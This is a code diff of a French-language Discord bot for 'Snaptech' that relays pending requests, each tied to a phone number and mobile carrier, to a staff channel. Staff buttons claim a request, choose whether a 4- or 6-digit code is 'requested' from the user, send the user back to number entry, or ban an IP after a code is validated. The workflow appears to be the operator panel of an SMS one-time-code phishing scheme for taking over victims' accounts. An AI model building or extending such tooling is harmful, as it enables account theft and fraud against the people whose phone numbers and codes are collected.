@@ -2,7 +2,6 @@ import 'dotenv/config';
 import { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder, REST, Routes } from 'discord.js';
 import { neon } from '@neondatabase/serverless';
 
-// ─── CONFIG ───
 const TOKEN = process.env.DISCORD_BOT_TOKEN;
 const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
 const GUILD_ID = process.env.DISCORD_GUILD_ID;
@@ -13,7 +12,6 @@ const API_BASE = process.env.API_BASE || 'https://snaptech.vercel.app';
 
 if (!TOKEN || !CLIENT_ID || !DATABASE_URL) {
     console.error('❌ Variables manquantes : DISCORD_BOT_TOKEN, DISCORD_CLIENT_ID, DATABASE_URL');
-    console.error('   Vérifie ton fichier .env et relance le bot.');
     process.exit(1);
 }
 
@@ -28,33 +26,26 @@ const client = new Client({
 
 // ─── COMMANDES SLASH ───
 const commands = [
-    new SlashCommandBuilder()
-        .setName('config')
-        .setDescription('Configurer le salon de logs')
+    new SlashCommandBuilder().setName('config').setDescription('Configurer le salon de logs')
         .addChannelOption(opt => opt.setName('salon').setDescription('Salon Discord').setRequired(true)),
-    new SlashCommandBuilder()
-        .setName('panel')
-        .setDescription('Afficher le panel staff'),
-    new SlashCommandBuilder()
-        .setName('claim')
-        .setDescription('Prendre en charge une demande')
-        .addStringOption(opt => opt.setName('phone').setDescription('Numéro de téléphone').setRequired(true)),
-    new SlashCommandBuilder()
-        .setName('sendcode')
-        .setDescription('Envoyer un code SMS au client')
-        .addStringOption(opt => opt.setName('phone').setDescription('Numéro de téléphone').setRequired(true))
-        .addStringOption(opt => opt.setName('code').setDescription('Code à 6 chiffres').setRequired(true))
+    new SlashCommandBuilder().setName('panel').setDescription('Afficher le panel staff'),
+    new SlashCommandBuilder().setName('claim').setDescription('Prendre en charge une demande')
+        .addStringOption(opt => opt.setName('phone').setDescription('Numéro').setRequired(true)),
+    new SlashCommandBuilder().setName('setlength').setDescription('Définir la longueur du code')
+        .addStringOption(opt => opt.setName('phone').setDescription('Numéro').setRequired(true))
+        .addIntegerOption(opt => opt.setName('length').setDescription('4 ou 6').setRequired(true)),
+    new SlashCommandBuilder().setName('wrongnumber').setDescription('Signaler wrong number')
+        .addStringOption(opt => opt.setName('phone').setDescription('Numéro').setRequired(true)),
+    new SlashCommandBuilder().setName('banip').setDescription('Bannir une IP')
+        .addStringOption(opt => opt.setName('ip').setDescription('Adresse IP').setRequired(true))
 ];
 
-// Déployer les commandes
 const rest = new REST({ version: '10' }).setToken(TOKEN);
 (async () => {
     try {
         console.log('🔄 Déploiement des commandes slash...');
         await rest.put(
-            GUILD_ID
-                ? Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID)
-                : Routes.applicationCommands(CLIENT_ID),
+            GUILD_ID ? Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID) : Routes.applicationCommands(CLIENT_ID),
             { body: commands.map(c => c.toJSON()) }
         );
         console.log('✅ Commandes déployées');
@@ -63,15 +54,15 @@ const rest = new REST({ version: '10' }).setToken(TOKEN);
     }
 })();
 
-// ─── EVENTS ───
+// ─── READY ───
 client.once('ready', () => {
-    console.log(`🤖 Bot connecté en tant que ${client.user.tag}`);
-    console.log(`📡 API Base: ${API_BASE}`);
-    console.log(`📝 Salon logs: ${LOG_CHANNEL_ID || 'Non configuré — utilise /config'}`);
+    console.log(`🤖 Bot connecté : ${client.user.tag}`);
+    console.log(`📡 API: ${API_BASE}`);
+    console.log(`📝 Salon: ${LOG_CHANNEL_ID || 'Non configuré'}`);
     startPolling();
 });
 
-// ─── POLLING DB → envoie embeds Discord ───
+// ─── POLLING ───
 let lastCheckedId = 0;
 
 async function startPolling() {
@@ -83,23 +74,19 @@ async function startPolling() {
                 WHERE id > ${lastCheckedId} AND status = 'pending'
                 ORDER BY id ASC
             `;
-
             for (const row of rows) {
                 lastCheckedId = Math.max(lastCheckedId, row.id);
                 await sendNewRequestEmbed(row);
             }
         } catch (e) {
-            console.error('Polling error:', e);
+            console.error('Polling error:', e.message || e);
         }
     }, 5000);
 }
 
 async function sendNewRequestEmbed(row) {
     const channel = client.channels.cache.get(LOG_CHANNEL_ID);
-    if (!channel) {
-        console.log(`⚠️ Salon ${LOG_CHANNEL_ID} non trouvé. Utilise /config salon:#ton-salon`);
-        return;
-    }
+    if (!channel) { console.log('⚠️ Salon non trouvé'); return; }
 
     const carrierNames = {
         'orange': 'Orange', 'sfr': 'SFR', 'bouygues': 'Bouygues',
@@ -122,17 +109,11 @@ async function sendNewRequestEmbed(row) {
         .setTimestamp();
 
     const rowButtons = new ActionRowBuilder().addComponents(
-        new ButtonBuilder()
-            .setCustomId(`claim_${row.phone}`)
-            .setLabel('📋 Prendre en charge')
-            .setStyle(ButtonStyle.Primary),
-        new ButtonBuilder()
-            .setCustomId(`sendcode_${row.phone}`)
-            .setLabel('📩 Envoyer un code')
-            .setStyle(ButtonStyle.Success)
+        new ButtonBuilder().setCustomId(`claim_${row.phone}`).setLabel('📋 Prendre en charge').setStyle(ButtonStyle.Primary)
     );
 
     await channel.send({ embeds: [embed], components: [rowButtons] });
+    console.log(`📨 Nouvelle demande : ${row.phone}`);
 }
 
 // ─── INTERACTIONS BOUTONS ───
@@ -141,8 +122,9 @@ client.on('interactionCreate', async interaction => {
 
     const [action, phone] = interaction.customId.split('_');
 
+    // ─── CLAIM ───
     if (action === 'claim') {
-        await interaction.deferReply({ ephemeral: true });
+        await interaction.deferReply({ flags: 64 });
 
         try {
             const res = await fetch(`${API_BASE}/api/staff-action`, {
@@ -153,83 +135,181 @@ client.on('interactionCreate', async interaction => {
             const data = await res.json();
 
             if (data.success) {
-                await interaction.editReply({
-                    content: `✅ Demande **${phone}** prise en charge !\n\nEnvoyez maintenant le code SMS avec :\n\`/sendcode phone:${phone} code:123456\``
-                });
+                await interaction.editReply({ content: `✅ Demande **${phone}** prise en charge par <@${interaction.user.id}>` });
 
-                const originalEmbed = EmbedBuilder.from(interaction.message.embeds[0])
+                // Nouveaux boutons : 4 chiffres, 6 chiffres, Wrong Number
+                const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                     .setColor(0x3b82f6)
                     .setTitle('📱 Demande en cours de traitement')
-                    .setDescription(`👤 Pris en charge par <@${interaction.user.id}>`);
+                    .setDescription(`👤 Pris en charge par <@${interaction.user.id}>\n\nChoisissez l'action :`);
 
-                await interaction.message.edit({ embeds: [originalEmbed], components: [] });
+                const actionRow = new ActionRowBuilder().addComponents(
+                    new ButtonBuilder().setCustomId(`len4_${phone}`).setLabel('🔢 4 chiffres').setStyle(ButtonStyle.Success),
+                    new ButtonBuilder().setCustomId(`len6_${phone}`).setLabel('🔢 6 chiffres').setStyle(ButtonStyle.Success),
+                    new ButtonBuilder().setCustomId(`wrong_${phone}`).setLabel('❌ Wrong Number').setStyle(ButtonStyle.Danger)
+                );
+
+                await interaction.message.edit({ embeds: [newEmbed], components: [actionRow] });
             } else {
-                await interaction.editReply({ content: `❌ Erreur: ${data.message}` });
+                await interaction.editReply({ content: `❌ ${data.message}` });
             }
         } catch (e) {
             await interaction.editReply({ content: '❌ Erreur réseau' });
         }
     }
 
-    if (action === 'sendcode') {
-        await interaction.deferReply({ ephemeral: true });
-        await interaction.editReply({
-            content: `📩 Utilisez la commande slash :\n\`/sendcode phone:${phone} code:123456\``
-        });
+    // ─── 4 CHIFFRES ───
+    if (action === 'len4') {
+        await interaction.deferReply({ flags: 64 });
+        try {
+            const res = await fetch(`${API_BASE}/api/staff-action`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'set_length', phone, length: 4, secret: STAFF_SECRET })
+            });
+            const data = await res.json();
+            await interaction.editReply({ content: data.success ? `✅ Code à 4 chiffres demandé pour ${phone}` : `❌ ${data.message}` });
+            if (data.success) {
+                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
+                    .setColor(0xf59e0b)
+                    .setTitle('📱 En attente du code (4 chiffres)')
+                    .setDescription(`👤 Pris en charge\n🔢 Code demandé : **4 chiffres**`);
+                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
+            }
+        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+    }
+
+    // ─── 6 CHIFFRES ───
+    if (action === 'len6') {
+        await interaction.deferReply({ flags: 64 });
+        try {
+            const res = await fetch(`${API_BASE}/api/staff-action`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'set_length', phone, length: 6, secret: STAFF_SECRET })
+            });
+            const data = await res.json();
+            await interaction.editReply({ content: data.success ? `✅ Code à 6 chiffres demandé pour ${phone}` : `❌ ${data.message}` });
+            if (data.success) {
+                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
+                    .setColor(0xf59e0b)
+                    .setTitle('📱 En attente du code (6 chiffres)')
+                    .setDescription(`👤 Pris en charge\n🔢 Code demandé : **6 chiffres**`);
+                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
+            }
+        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+    }
+
+    // ─── WRONG NUMBER ───
+    if (action === 'wrong') {
+        await interaction.deferReply({ flags: 64 });
+        try {
+            const res = await fetch(`${API_BASE}/api/staff-action`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'wrong_number', phone, secret: STAFF_SECRET })
+            });
+            const data = await res.json();
+            await interaction.editReply({ content: data.success ? `✅ Wrong number signalé pour ${phone}` : `❌ ${data.message}` });
+            if (data.success) {
+                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
+                    .setColor(0xef4444)
+                    .setTitle('📱 Wrong Number')
+                    .setDescription(`❌ L'utilisateur a été redirigé vers la saisie du numéro.`);
+                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
+            }
+        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+    }
+
+    // ─── BAN IP (depuis l'embed de code validé) ───
+    if (action === 'banip') {
+        await interaction.deferReply({ flags: 64 });
+        const ip = phone; // dans customId c'est banip_<ip>
+        try {
+            const res = await fetch(`${API_BASE}/api/ban-ip`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ip, secret: STAFF_SECRET, banned_by: interaction.user.tag })
+            });
+            const data = await res.json();
+            await interaction.editReply({ content: data.success ? `🚫 IP **${ip}** bannie avec succès !` : `❌ ${data.message}` });
+            if (data.success) {
+                const bannedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
+                    .setColor(0xef4444)
+                    .setTitle('🔨 IP Bannie')
+                    .setDescription(`🚫 IP **${ip}** bannie par <@${interaction.user.id}>`);
+                await interaction.message.edit({ embeds: [bannedEmbed], components: [] });
+            }
+        } catch (e) { await interaction.editReply({ content: '❌ Erreur réseau' }); }
     }
 });
 
-// ─── COMMANDES SLASH HANDLERS ───
+// ─── COMMANDES SLASH ───
 client.on('interactionCreate', async interaction => {
     if (!interaction.isChatInputCommand()) return;
 
     if (interaction.commandName === 'config') {
         const salon = interaction.options.getChannel('salon');
         process.env.DISCORD_LOG_CHANNEL_ID = salon.id;
-        await interaction.reply({ content: `✅ Salon de logs configuré : <#${salon.id}>`, ephemeral: true });
+        await interaction.reply({ content: `✅ Salon configuré : <#${salon.id}>`, flags: 64 });
     }
 
     if (interaction.commandName === 'panel') {
-        const embed = new EmbedBuilder()
-            .setTitle('🎛️ Panel Staff Snaptech')
-            .setDescription('Les nouvelles demandes apparaissent automatiquement ici.')
-            .setColor(0x000000);
+        const embed = new EmbedBuilder().setTitle('🎛️ Panel Staff').setDescription('Les demandes apparaissent ici.').setColor(0x000000);
         await interaction.reply({ embeds: [embed] });
     }
 
     if (interaction.commandName === 'claim') {
         const phone = interaction.options.getString('phone');
         await interaction.deferReply();
-
         try {
             const res = await fetch(`${API_BASE}/api/staff-action`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ action: 'claim', phone, secret: STAFF_SECRET })
             });
             const data = await res.json();
             await interaction.editReply({ content: data.success ? `✅ ${data.message}` : `❌ ${data.message}` });
-        } catch (e) {
-            await interaction.editReply({ content: '❌ Erreur' });
-        }
+        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
     }
 
-    if (interaction.commandName === 'sendcode') {
+    if (interaction.commandName === 'setlength') {
         const phone = interaction.options.getString('phone');
-        const code = interaction.options.getString('code');
+        const length = interaction.options.getInteger('length');
         await interaction.deferReply();
-
         try {
             const res = await fetch(`${API_BASE}/api/staff-action`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ action: 'send_code', phone, code, secret: STAFF_SECRET })
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'set_length', phone, length, secret: STAFF_SECRET })
             });
             const data = await res.json();
-            await interaction.editReply({ content: data.success ? `✅ Code envoyé au client !` : `❌ ${data.message}` });
-        } catch (e) {
-            await interaction.editReply({ content: '❌ Erreur' });
-        }
+            await interaction.editReply({ content: data.success ? `✅ ${data.message}` : `❌ ${data.message}` });
+        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+    }
+
+    if (interaction.commandName === 'wrongnumber') {
+        const phone = interaction.options.getString('phone');
+        await interaction.deferReply();
+        try {
+            const res = await fetch(`${API_BASE}/api/staff-action`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'wrong_number', phone, secret: STAFF_SECRET })
+            });
+            const data = await res.json();
+            await interaction.editReply({ content: data.success ? `✅ ${data.message}` : `❌ ${data.message}` });
+        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+    }
+
+    if (interaction.commandName === 'banip') {
+        const ip = interaction.options.getString('ip');
+        await interaction.deferReply();
+        try {
+            const res = await fetch(`${API_BASE}/api/ban-ip`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ip, secret: STAFF_SECRET, banned_by: interaction.user.tag })
+            });
+            const data = await res.json();
+            await interaction.editReply({ content: data.success ? `🚫 ${data.message}` : `❌ ${data.message}` });
+        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
     }
 });
 
